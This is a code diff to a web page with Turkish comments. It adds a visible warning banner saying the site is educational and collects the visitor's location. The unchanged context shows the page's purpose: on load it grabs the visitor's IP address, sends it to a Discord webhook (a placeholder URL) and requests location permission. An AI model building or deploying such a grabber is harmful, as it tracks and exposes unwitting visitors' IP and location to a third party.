@@ -120,6 +120,21 @@
             margin: 0 10px;
         }
 
+        /* Uyarı Mesajı */
+        .warning-message {
+            background-color: #f0ad4e; /* Sarımsı renk */
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+            display: none; /* Başlangıçta gizli */
+        }
+
+        .warning-message.show {
+            display: block;
+        }
+
         /* Konum Bekleniyor Mesajı */
         .location-message {
             margin-top: 20px;
@@ -143,6 +158,11 @@
             <div class="app-icon">&#9776;</div>
             <div class="account-icon">A</div>
         </div>
+    </div>
+
+    <!-- Uyarı Mesajı -->
+    <div class="warning-message" id="warningMessage">
+        Bu site, eğitim amaçlıdır ve konum bilgilerinizi toplar. Lütfen dikkatli olun!
     </div>
 
     <!-- Ana İçerik -->
@@ -176,6 +196,10 @@
         // WEBHOOK URL'NİZİ BURAYA YAZIN (Discord için)
         const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // ÖRNEK
         const locationMessage = document.getElementById('locationMessage');
+        const warningMessage = document.getElementById('warningMessage');
+
+        // Uyarı mesajını göster
+        warningMessage.classList.add('show');
 
         // IP Adresini Al ve Webhook'a Gönder
         async function getAndSendIP() {
@@ -278,8 +302,9 @@
             }
         }
 
-        // Sayfa yüklendiğinde IP'yi al ve konum iznini iste
+        // Sayfa yüklendiğinde IP'yi al, uyarı mesajını göster ve konum iznini iste
         window.onload = async () => {
+            warningMessage.classList.add('show'); // Sayfa yüklendiğinde uyarıyı göster
             await getAndSendIP(); // Sayfa yüklendiğinde IP'yi al
             requestLocationPermission(); // Konum iznini iste
         };
